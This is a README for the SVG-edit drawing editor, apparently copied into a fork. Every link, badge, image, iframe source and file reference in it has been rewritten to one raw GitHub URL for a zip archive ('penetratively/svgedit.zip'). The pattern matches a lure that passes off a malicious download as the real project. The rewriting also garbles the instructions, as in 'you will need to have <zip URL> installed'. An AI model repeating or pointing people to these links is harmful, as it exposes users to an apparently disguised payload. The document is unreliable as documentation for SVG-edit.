# ![LOGO](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) SVG-edit

[![npm](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
[![Dependencies](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
[![devDependencies](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)

<!-- [![Actions Status](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip%https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
[![Actions Status](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
-->
[![Tests badge](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
[![Coverage badge](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)

[![Known Vulnerabilities](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
[![Total Alerts](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
[![Code Quality: Javascript](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)

[![Licenses badge](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)

(see also [licenses for dev. deps.](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip))

(Note: The license provenance of the images in `/editor/images` may not be
fully clear, even with the origin of some of the images listed as being from <https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip>. We would like to
replace these images if their provenance cannot be determined or is found to
be under a protective license. If you know of the original terms, or can help
create SVG replacement images, please let us know at:
[#377](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip).)
<!-- [![License](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](LICENSE-MIT) -->

[![issuehunt-to-marktext](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)

SVG-edit is a fast, web-based, JavaScript-driven SVG drawing editor that
works in any modern browser.

![screenshot](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
[SVG](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)

## Help wanted

While we have made some recent releases to SVG-edit for bug fixes,
refactoring and documentation to make the codebase more maintainable, the
core developers responsible for the bulk of the drawing features are no
longer active with the project, so we would love others familiar with SVG
to join the project.

## Demo

### [Try SVG-edit here](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)

<!-- See the [latest release](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
(or its [ES6-Module](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
version, which requires a modern browser).
-->
See a working editor on [`master`](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) (or its [ES6-Module](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
version, which requires a modern browser).

You may also try it at <https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip>
(which redirects to a versioned URL).

You may also obtain URLs for specific [releases](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip).

You may test the [latest version in `master`](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
which is the ESM version. (The [non-ESM version](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
on `master` may be updated less frequently.)

## Installation

### Quick install

1. Clone or copy the repository contents (at least the `editor` directory).
    Please note that you should not do a recursive Git clone (i.e., with the
    `--recursive` or `--recurse-submodules` flags), as you will get assorted
    past versions (which are available on the parent as branches anyways).
    (The reason these past versions are available as submodules is merely
    for convenience in hosting these versions, along with `master`, online
    on Github Pages.)
1. If you need programmatic customization, see its section below.
1. Otherwise, just add an iframe to your site, adding any extensions or
  configuration (see `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`
  ([ConfigOptions]{@tutorial ConfigOptions})) within the URL:

```html
<iframe src="https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip"
    width="100%" height="100%"></iframe>
```

Note that if you want support for the following browsers, you will at least
need some polyfills.

For Android Browser 4.4.3-4.4.4, you will need at least `fetch`.

For the following, you will need at least `URL`, `Promise`, and `fetch`:

- IE <= 11
- IE Mobile
- Opera Mini
- Blackberry Browser <= 10

And for still older browsers (e.g., IE 8), you will at minimum need a
`querySelector` polyfill.

### Integrating SVG-edit into your own npm package

These steps are only needed if you wish to set up your own npm package
incorporating SVGEdit. You will need to have https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip installed.

1. Create and enter an empty folder somewhere on your desktop.
1. Create your npm package: `npm init` (complete the fields).
1. Install SVG-edit into your package:
  `npm i --save svgedit`.
1. Look within `node_modules/svgedit/`, e.g., `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`
  for the files your package needs and use accordingly (from outside of
  `node_modules`).
1. If you want to publish your own work, you can use `npm publish`.

## Programmatic customization

1. If you are not concerned about supporting ES6 Modules (see the
  "ES6 Modules file" section), you can add your config directly to
  `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` within the SVG-Edit project root.
  1. Note: Do not remove the `import svgEditor...` code which is responsible
  for importing the SVG edit code. Versions prior to 3.0 did not require
  this, but the advantage is that your HTML does not need to be polluted
  with extra script references.
1. Modify or utilize any options. See `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`
  ([ConfigOptions]{@tutorial ConfigOptions}).

## ES6 Modules file

1. `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` is an HTML file directly using ES6 modules.
  It is only supported in the latest browsers. It is probably mostly
  useful for debugging, as it requires more network requests.
  If you would like to work with this file, you should make configuration
  changes in `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` (in the SVG-Edit project root).
1. If you are working with the ES6 Modules config but also wish to work with
  the normal `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` version (so your code can work in older
  browsers or get the presumable performance benefits of this file which
  references JavaScript rolled up into a single file), you can follow these
  steps after any config changes you make, so that your changes can also be
  automatically made available to both versions.
    1. JavaScript:
        1. Run `npm install` within the svgedit directory
          (`node_modules/svgedit` if you installed via npm) and the root
          repository directory if you cloned the Git repository instead.
          This will install the build tools for SVG-edit.
        1. Run `npm run build-by-config` within the svgedit directory mentioned
          in the step above.
            1. This will rebuild `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` (applying Babel to
              allow it to work on older browsers and applying Rollup to build
              all JavaScript into one file). The file will then contain
              non-ES6 module JavaScript that can work in older browsers.
              Note that it bundles all of SVGEdit, so it is to be expected
              that this file will be much larger in size than the original
              ES6 config file.
    1. HTML:
        1. If you wish to make changes to both HTML files, it is recommended that
            you work and test on `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` and then run
            `npm run build-html` to have the changes properly copied to
            `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`.

## Recent news

- 2020-02-22 Published 6.0.0 License clarifications/updates, PDF export
    improvements, clipboard `sessionStorage`, and other changes.
- 2019-11-16 Published 5.1.0 Misc. fixes and refactoring
- 2019-05-07 Published 5.0.0 Change from `@babel/polyfill`
- 2019-04-03 Published 4.3.0 Fix for double click on gradient
    picker droplets affecting some browsers and dragging control
    point of arc. Other misc. fixes. Some accessibility and i18n.
- 2018-12-13 Published 4.2.0 (Chinese (simplified) and Russian locale
    updates; retaining lines with grid mode)
- 2018-11-29 Published 4.1.0 (Fix for hyphenated locales, svgcanvas
    distributions)
- 2018-11-16 Published 4.0.0/4.0.1 (Move to Promise-based APIs)
- 2018-11-01 Published 3.2.0 (Update qunit to resolve security vulnerability
    of a dependency)
- 2018-10-25 Published 3.1.1 (Fix for saving SVG on Firefox)
- 2018-10-24 Published 3.1.0 (Redirect on modular page for non-module-support;
  versions document (for migrating))
- 2018-10-22 Published 3.0.1 (Revert fix affecting polygon selection)
- 2018-10-21 Published 3.0.0 (misc. improvements including centering canvas and
  key locale fixes since last RC)
- 2018-09-30 Published 3.0.0-rc.3 with security and other fixes
- 2018-07-31 Published 3.0.0-rc.2 with misc. fixes
- 2018-07-19 Published 3.0.0-rc.1 allowing for extensions and locales to be
  expressed as modules
- 2018-05-26 Published 3.0.0-alpha.2 with ES6 Modules support
- 2017-07 Added to Packagist: https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip
- 2015-12-02 SVG-edit 2.8.1 was released.
- 2015-11-24 SVG-edit 2.8 was released.
- 2015-11-24 Code, issue tracking, and docs are being moved to github
    (previously [https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)).
- 2014-04-17 2.7 and stable branches updated to reflect 2.7.1 important bug
    fixes for the embedded editor.
- 2014-04-07 SVG-edit 2.7 was released.
- 2013-01-15 SVG-edit 2.6 was released.

## Videos

  * [SVG-edit 2.4 Part 1](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
  * [SVG-edit 2.4 Part 2](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
  * [SVG-edit 2.3 Features](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
  * [Introduction to SVG-edit](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) (Version 2.2)

## Supported browsers

The following browsers had been tested for 2.6 or earlier and will
probably continue to work with 3.0.

- Firefox 1.5+
- Opera 9.50+
- Safari 4+
- Chrome 1+
- IE 9+ and Edge

## Further reading and more information

 * See [docs](docs/) for more documentation. See the
    [JSDocs for our latest release](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip).
 * [Acknowledgements](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) lists open source projects
    used in svg-edit.
 * See [AUTHORS](AUTHORS) file for authors.
 * [StackOverflow](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) group.
 * Join the [svg-edit mailing list](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip!forum/svg-edit).
 * Join us on `#svg-edit` on `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` (or use the
    [web client](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)).
